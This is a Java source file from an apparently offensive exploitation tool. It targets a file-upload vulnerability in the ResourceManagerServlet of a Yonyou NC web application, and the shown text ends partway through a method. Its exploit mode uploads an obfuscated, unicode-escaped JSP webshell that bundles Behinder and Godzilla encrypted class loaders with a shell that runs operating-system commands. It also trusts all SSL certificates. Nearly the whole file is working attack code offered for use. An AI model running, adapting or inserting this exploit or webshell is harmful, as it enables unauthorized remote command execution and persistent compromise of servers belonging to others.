package com.chave.vuln;

import com.chave.config.ClassCode;
import com.chave.config.ClassName;
import com.chave.config.Config;
import com.chave.config.Mod;
import com.chave.gadget.chain.CommonsCollections6_Array;
import com.chave.proxy.HttpProxy;
import com.chave.utils.HttpUtil;
import com.chave.utils.SSLUtil;
import com.chave.utils.Util;
import javafx.scene.control.TextArea;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

public class ResourceManagerServlet_Upload extends VulnBase {
    public static boolean DNSLOG = false;
    public static boolean JNDI = false;
    public static boolean EXEC = true;
    public static boolean UPLOAD = true;
    public static boolean GETSHELL = true;

    private String pocFlag = "yyds";
    private String expFlag = ">@<";

    public ResourceManagerServlet_Upload() {
    }

    public ResourceManagerServlet_Upload(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
        String vulnerable_url = Config.TARGET + "/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";

        try {
            if (Config.MOD.equals(Mod.POC)) {
                poc(vulnerable_url);
                return;
            } else if (Config.MOD.equals(Mod.EXP)) {
                exp(vulnerable_url);
                return;
            } else if (Config.MOD.equals(Mod.EXEC)) {
                exec(vulnerable_url);
                return;
            } else if (Config.MOD.equals(Mod.UPLOAD)) {
                upload(vulnerable_url);
                return;
            }
        } catch (Exception e) {

        }
    }

    private void poc(String url) {
        try {
            URL apiUrl = new URL(url);
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 定义上传文件名与内容
            String filename = System.currentTimeMillis() + ".jsp";
            String fileText = "<%\\u006f\\u0075\\u0074.\\u0070\\u0072\\u0069\\u006e\\u0074(\"yy\"+" + "\"ds\");%>";

            // 构造请求体
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            HashMap map = new HashMap();
            map.put("cmd", "saveFile");
            map.put("id", "webapps\\nc_web\\" + filename);
            map.put("group", "");
            oos.writeObject(map);
            byte[] postData = Util.byteArrayMerger(baos.toByteArray(), fileText.getBytes(StandardCharsets.UTF_8));

            HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn1);

            // 设置请求头
            conn1.setRequestProperty("Content-Type", "multipart/form-data");
            conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));

            HttpUtil.post(conn1, postData);

            int responseCode1 = HttpUtil.getResponseCode(conn1);

            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                URL fileUrl = new URL(Config.TARGET + "/" + filename);

                HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(conn2);

                // 检测上传文件是否存在
                try {
                    HttpUtil.get(conn2);
                    int responseCode2 = HttpUtil.getResponseCode(conn2);
                    String responseText2 = HttpUtil.getResponseText(conn2);
                    if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(pocFlag)) {
                        logMessage("[+] ResourceManagerServlet 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
                        return;
                    } else {
                        logMessage("[-] ResourceManagerServlet 文件上传漏洞不存在, 请尝试手动利用.");
                        return;
                    }

                } catch (Exception e) {
                    logMessage("[-] ResourceManagerServlet 文件上传漏洞不存在, 请尝试手动利用.");
                    return;
                }

            } else {
                logMessage("[-] ResourceManagerServlet 文件上传漏洞不存在, 请尝试手动利用.");
                return;
            }
        } catch (Exception e) {
            logMessage("[-] ResourceManagerServlet 文件上传漏洞不存在, 请尝试手动利用.");
            return;
        }
    }

    private void exp(String url) {
        try {
            URL apiUrl = new URL(url);
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 定义上传文件名与内容
            String filename = System.currentTimeMillis() + ".jsp";
            String fileText = "<%@page import=\"\\u006a\\u0061\\u0076\\u0061.\\u0075\\u0074\\u0069\\u006c.*,\\u006a\\u0061\\u0076\\u0061\\u0078.\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f.*,\\u006a\\u0061\\u0076\\u0061\\u0078.\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f.\\u0073\\u0070\\u0065\\u0063.*\"%><%@page import=\"\\u0073\\u0075\\u006e.\\u006d\\u0069\\u0073\\u0063.\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072\"%><%!\\u0063\\u006c\\u0061\\u0073\\u0073 U \\u0065\\u0078\\u0074\\u0065\\u006e\\u0064\\u0073 \\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072{U(\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072 c){ \\u0073\\u0075\\u0070\\u0065\\u0072(c);}\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0043\\u006c\\u0061\\u0073\\u0073 g(\\u0062\\u0079\\u0074\\u0065 []b){ \\u0072\\u0065\\u0074\\u0075\\u0072\\u006e \\u0073\\u0075\\u0070\\u0065\\u0072.\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073(b,0,b.\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068);}}%><%\\u0074\\u0072\\u0079{\\u0069\\u0066(\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064().\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"POST\")&&\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-data\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"behinder\")&&\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-referer\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"http://www.baidu.com/\")){\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 k=\"5597c70166e41d3a\";\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e.\\u0070\\u0075\\u0074\\u0056\\u0061\\u006c\\u0075\\u0065(\"u\",k);\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072 c=\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065(\"AES\");c.\\u0069\\u006e\\u0069\\u0074(2,\\u006e\\u0065\\u0077 \\u0053\\u0065\\u0063\\u0072\\u0065\\u0074\\u004b\\u0065\\u0079\\u0053\\u0070\\u0065\\u0063(k.\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073(),\"AES\"));\\u006e\\u0065\\u0077 U(this.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072()).g(c.doFinal(\\u006e\\u0065\\u0077 sun.\\u006d\\u0069\\u0073\\u0063.\\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072().\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072(\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072().\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065()))).\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065().\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\\u0070\\u0061\\u0067\\u0065\\u0043\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074);}}\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){}%><%!\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 xc=\"5597c70166e41d3a\";\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 pass=\"pass\";\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 md5=md5(pass+xc);\\u0063\\u006c\\u0061\\u0073\\u0073 X extends \\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072{ \\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 X(\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072 z){super(z); }\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0043\\u006c\\u0061\\u0073\\u0073 Q(\\u0062\\u0079\\u0074\\u0065[] cb){\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e super.\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0043\\u006c\\u0061\\u0073\\u0073(cb,0,cb.length);}}\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0062\\u0079\\u0074\\u0065[] x(\\u0062\\u0079\\u0074\\u0065[] s,\\u0062\\u006f\\u006f\\u006c\\u0065\\u0061\\u006e m){\\u0074\\u0072\\u0079{\\u006a\\u0061\\u0076\\u0061\\u0078.\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f.\\u0043\\u0069\\u0070\\u0068\\u0065\\u0072 c=\\u006a\\u0061\\u0076\\u0061\\u0078.\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f.Cipher.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065(\"AES\");c.\\u0069\\u006e\\u0069\\u0074(m?1:2,\\u006e\\u0065\\u0077 \\u006a\\u0061\\u0076\\u0061\\u0078.\\u0063\\u0072\\u0079\\u0070\\u0074\\u006f.spec.\\u0053\\u0065\\u0063\\u0072\\u0065\\u0074\\u004b\\u0065\\u0079\\u0053\\u0070\\u0065\\u0063(xc.\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073(),\"AES\"));\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e c.doFinal(s); }\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e \\u006e\\u0075\\u006c\\u006c;}}\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0073\\u0074\\u0061\\u0074\\u0069\\u0063 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 md5(\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 s){\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 ret=\\u006e\\u0075\\u006c\\u006c;\\u0074\\u0072\\u0079{ \\u006a\\u0061\\u0076\\u0061.\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079.MessageDigest m;m=\\u006a\\u0061\\u0076\\u0061.security.MessageDigest.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065(\"MD5\");m.update(s.\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073(),0,s.length());ret=\\u006e\\u0065\\u0077 \\u006a\\u0061\\u0076\\u0061.math.BigInteger(1,m.digest()).\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(16).toUpperCase();}\\u0063\\u0061\\u0074\\u0063\\u0068(\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){}\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e ret;}\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0073\\u0074\\u0061\\u0074\\u0069\\u0063 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 \\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0045\\u006e\\u0063\\u006f\\u0064\\u0065(\\u0062\\u0079\\u0074\\u0065[] bs) throws \\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e{\\u0043\\u006c\\u0061\\u0073\\u0073 base64;\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 value=\\u006e\\u0075\\u006c\\u006c;\\u0074\\u0072\\u0079{base64=\\u0043\\u006c\\u0061\\u0073\\u0073.\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065(\"java.util.Base64\");\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074 Encoder=base64.\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"getEncoder\",\\u006e\\u0075\\u006c\\u006c).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(base64, \\u006e\\u0075\\u006c\\u006c);value=(\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067)Encoder.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"encodeToString\",\\u006e\\u0065\\u0077 \\u0043\\u006c\\u0061\\u0073\\u0073[] {\\u0062\\u0079\\u0074\\u0065[].\\u0063\\u006c\\u0061\\u0073\\u0073}).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(Encoder,\\u006e\\u0065\\u0077 \\u004f\\u0062\\u006a\\u0065\\u0063\\u0074[]{bs});} \\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){\\u0074\\u0072\\u0079 {base64=\\u0043\\u006c\\u0061\\u0073\\u0073.forName(\"sun.misc.BASE64Encoder\");\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074 Encoder = base64.\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065();value = (\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067)Encoder.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"encode\",\\u006e\\u0065\\u0077 \\u0043\\u006c\\u0061\\u0073\\u0073[]{\\u0062\\u0079\\u0074\\u0065[].\\u0063\\u006c\\u0061\\u0073\\u0073}).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(Encoder,\\u006e\\u0065\\u0077 \\u004f\\u0062\\u006a\\u0065\\u0063\\u0074[] {bs});}\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e2){}}\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e value; }\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0073\\u0074\\u0061\\u0074\\u0069\\u0063 \\u0062\\u0079\\u0074\\u0065[] base64Decode(\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 bs) throws \\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e { \\u0043\\u006c\\u0061\\u0073\\u0073 base64;\\u0062\\u0079\\u0074\\u0065[] value = \\u006e\\u0075\\u006c\\u006c;\\u0074\\u0072\\u0079 { \\u0062\\u0061\\u0073\\u0065\\u0036\\u0034=\\u0043\\u006c\\u0061\\u0073\\u0073.\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065(\"java.util.Base64\");\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074 decoder=\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034.\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"getDecoder\",\\u006e\\u0075\\u006c\\u006c).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034,\\u006e\\u0075\\u006c\\u006c);value=(\\u0062\\u0079\\u0074\\u0065[])decoder.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"decode\", \\u006e\\u0065\\u0077 \\u0043\\u006c\\u0061\\u0073\\u0073[]{ \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067.\\u0063\\u006c\\u0061\\u0073\\u0073 }).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(decoder,\\u006e\\u0065\\u0077 \\u004f\\u0062\\u006a\\u0065\\u0063\\u0074[]{bs});}\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){\\u0074\\u0072\\u0079{ \\u0062\\u0061\\u0073\\u0065\\u0036\\u0034=\\u0043\\u006c\\u0061\\u0073\\u0073.\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065(\"sun.misc.BASE64Decoder\");\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074 decoder=\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034.\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065();value=(\\u0062\\u0079\\u0074\\u0065[])decoder.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064(\"decodeBuffer\",\\u006e\\u0065\\u0077 \\u0043\\u006c\\u0061\\u0073\\u0073[] { \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067.\\u0063\\u006c\\u0061\\u0073\\u0073}).\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065(decoder, \\u006e\\u0065\\u0077 \\u004f\\u0062\\u006a\\u0065\\u0063\\u0074[]{bs});}\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e2) {} }\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e value; }%><%\\u0074\\u0072\\u0079 { if (\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-data\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"godzilla\") && \\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-referer\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"http://www.baidu.com/\")) { \\u0074\\u0072\\u0079{\\u0062\\u0079\\u0074\\u0065[] data=base64Decode(\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.getParameter(pass));data=x(data, false);if (\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e.\\u0067\\u0065\\u0074\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065(\"payload\")==\\u006e\\u0075\\u006c\\u006c){ \\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e.setAttribute(\"payload\",\\u006e\\u0065\\u0077 X(this.\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073().\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072()).Q(data)); }else{ \\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.setAttribute(\"parameters\",data);\\u006a\\u0061\\u0076\\u0061.io.\\u0042\\u0079\\u0074\\u0065\\u0041\\u0072\\u0072\\u0061\\u0079\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d arrOut=\\u006e\\u0065\\u0077 \\u006a\\u0061\\u0076\\u0061.io.\\u0042\\u0079\\u0074\\u0065\\u0041\\u0072\\u0072\\u0061\\u0079\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d();\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074 f=((\\u0043\\u006c\\u0061\\u0073\\u0073)\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e.\\u0067\\u0065\\u0074\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065(\"payload\")).\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065();f.\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(arrOut);f.\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\\u0070\\u0061\\u0067\\u0065\\u0043\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074);\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.getWriter().write(md5.substring(0,16));f.\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067();\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.getWriter().write(\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0045\\u006e\\u0063\\u006f\\u0064\\u0065(x(arrOut.toByteArray(),true)));\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.getWriter().write(md5.substring(16));}}\\u0063\\u0061\\u0074\\u0063\\u0068 (\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){}}}\\u0063\\u0061\\u0074\\u0063\\u0068(\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){}%><%\\u0074\\u0072\\u0079{if (\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-data\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"testzxcv\")&&\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"x-client-referer\").\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073(\"http://www.baidu.com/\")){\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 \\u0065\\u0071\\u0075\\u0061\\u006c\\u0073=\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072(\"testzxcv\");if (\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073 != \\u006e\\u0075\\u006c\\u006c && !\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073.isEmpty()) { \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067[] \\u0063\\u006d\\u0064\\u0073 = \\u006e\\u0075\\u006c\\u006c;if(\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d.\\u0067\\u0065\\u0074\\u0050\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079(\"os.name\").toLowerCase().contains(\"win\")){\\u0063\\u006d\\u0064\\u0073=\\u006e\\u0065\\u0077 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067[]{\\u0022\\u0063\\u006d\\u0064\\u0022\\u002c\\u0022\\u002f\\u0063\\u0022,\\u006e\\u0065\\u0077 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077 \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072().\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072(\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073))};}else{\\u0063\\u006d\\u0064\\u0073=\\u006e\\u0065\\u0077 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067[]{\\u0022\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068\\u0022\\u002c\\u0022\\u002d\\u0063\\u0022,\\u006e\\u0065\\u0077 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077 \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072().\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072(\\u0065\\u0071\\u0075\\u0061\\u006c\\u0073))};}\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073 \\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073=\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065.\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065().\\u0065\\u0078\\u0065\\u0063(\\u0063\\u006d\\u0064\\u0073);\\u006a\\u0061\\u0076\\u0061.io.\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072 \\u0062\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072=\\u006e\\u0065\\u0077 \\u006a\\u0061\\u0076\\u0061.io.\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072(\\u006e\\u0065\\u0077 \\u006a\\u0061\\u0076\\u0061.io.\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072(\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d()));\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072 \\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072=\\u006e\\u0065\\u0077 \\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072();\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067 line;while ((line=\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072\\u0065\\u0064\\u0052\\u0065\\u0061\\u0064\\u0065\\u0072.\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065())!=\\u006e\\u0075\\u006c\\u006c){\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072.\\u0061\\u0070\\u0070\\u0065\\u006e\\u0064(line+'\\n'); }\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d().write(\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072.\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067().\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073());\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d().flush();\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065.\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d().close();\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e;}}}\\u0063\\u0061\\u0074\\u0063\\u0068(\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e e){}%><%\\u006f\\u0075\\u0074.\\u0070\\u0072\\u0069\\u006e\\u0074(\">@<\");%>";

            // 构造请求体
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            HashMap map = new HashMap();
            map.put("cmd", "saveFile");
            map.put("id", "webapps\\nc_web\\" + filename);
            map.put("group", "");
            oos.writeObject(map);
            byte[] postData = Util.byteArrayMerger(baos.toByteArray(), fileText.getBytes(StandardCharsets.UTF_8));

            HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn1);

            // 设置请求头
            conn1.setRequestProperty("Content-Type", "multipart/form-data");
            conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));

            HttpUtil.post(conn1, postData);

            int responseCode1 = HttpUtil.getResponseCode(conn1);

            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                URL fileUrl = new URL(Config.TARGET + "/" + filename);

                HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(conn2);

